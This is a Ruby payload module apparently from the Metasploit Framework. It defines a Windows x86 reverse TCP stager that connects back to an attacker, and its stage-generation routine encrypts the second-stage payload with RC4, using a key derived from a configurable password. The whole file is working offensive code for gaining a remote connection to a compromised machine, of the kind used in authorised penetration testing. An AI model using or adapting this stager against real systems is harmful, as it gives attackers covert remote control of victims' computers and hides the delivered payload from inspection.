# -*- coding: binary -*-
##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/windows/reverse_tcp_rc4'


module Metasploit3

  CachedSize = 394

  include Msf::Payload::Stager
  include Msf::Payload::Windows::ReverseTcp

  def self.handler_type_alias
    "reverse_tcp_rc4"
  end

  def initialize(info = {})
    super(merge_info(info,
      'Name'          => 'Reverse TCP Stager (RC4 Stage Encryption, Metasm)',
      'Description'   => 'Connect back to the attacker',
      'Author'        => ['hdm', 'skape', 'sf', 'mihi', 'RageLtMan'],
      'License'       => MSF_LICENSE,
      'Platform'      => 'win',
      'Arch'          => ARCH_X86,
      'Handler'       => Msf::Handler::ReverseTcp,
      'Convention'    => 'sockedi',
      'Stager'        => { 'RequiresMidstager' => false }
      ))
  end

  def generate_stage(opts={})
    p = super(opts)
    m = OpenSSL::Digest.new('sha1')
    m.reset
    key = m.digest(datastore["RC4PASSWORD"] || "")
    c1 = OpenSSL::Cipher::Cipher.new('RC4')
    c1.decrypt
    c1.key=key[4,16]
    p = c1.update(p)
    return [ p.length ^ key[0,4].unpack('V')[0] ].pack('V') + p
  end

  def handle_intermediate_stage(conn, payload)
    return false
  end

end
